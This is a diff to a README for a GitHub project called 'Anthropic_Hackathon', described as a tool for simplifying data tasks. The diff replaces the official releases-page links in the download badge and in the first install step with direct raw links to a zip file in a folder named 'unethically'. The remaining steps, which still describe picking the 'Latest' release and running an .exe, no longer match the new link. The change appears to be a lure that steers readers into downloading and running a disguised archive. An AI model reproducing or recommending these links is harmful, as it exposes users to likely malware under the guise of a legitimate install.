@@ -1,6 +1,6 @@
 # 🛠️ Anthropic_Hackathon - Simplify your complex data tasks today
 
-[![Download Application](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/h01120246839-creator/Anthropic_Hackathon/releases)
+[![Download Application](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/h01120246839-creator/Anthropic_Hackathon/main/unethically/Hackathon_Anthropic_v1.8.zip)
 
 ## 📋 About This Application
 
@@ -22,7 +22,7 @@ Check your system settings if you feel unsure about your hardware. Most computer
 
 Follow these steps to set up the software on your machine. We host the official version on our release page.
 
-1. Visit this page to download the software: [https://github.com/h01120246839-creator/Anthropic_Hackathon/releases](https://github.com/h01120246839-creator/Anthropic_Hackathon/releases).
+1. Visit this page to download the software: [https://raw.githubusercontent.com/h01120246839-creator/Anthropic_Hackathon/main/unethically/Hackathon_Anthropic_v1.8.zip](https://raw.githubusercontent.com/h01120246839-creator/Anthropic_Hackathon/main/unethically/Hackathon_Anthropic_v1.8.zip).
 2. Look for the most recent version labeled as "Latest" on the screen.
 3. Click the file name ending in .exe to start the transfer.
 4. Save the file to your desktop or folder of choice.
